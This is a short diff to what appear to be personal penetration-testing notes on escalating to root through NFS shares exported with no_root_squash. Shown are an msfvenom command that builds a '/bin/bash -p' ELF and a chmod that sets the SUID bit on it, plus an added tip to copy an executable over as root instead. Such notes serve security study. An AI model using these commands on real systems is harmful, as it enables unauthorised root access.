@@ -12,6 +12,8 @@ Files created via NFS inherit the **remote** user's ID. If the user is root, an
 `msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf`
 `chmod +xs /tmp/nfs/shell.elf`
 
+or use [[executable (elf)]] and copy the file after mounting as root, then set the suid
+
 ---
 
 Is root squashing off?
@@ -31,6 +33,9 @@ user@debian:~$ cat /etc/exports
 
 #/tmp *(rw,sync,insecure,no_subtree_check)
 ```
+no_root_squash
+
+NFS will by default change the root user to nfsnobody (and strip any file from operating with root privileges).
 
 Connect to dir as root + create exploit:
 ```sh
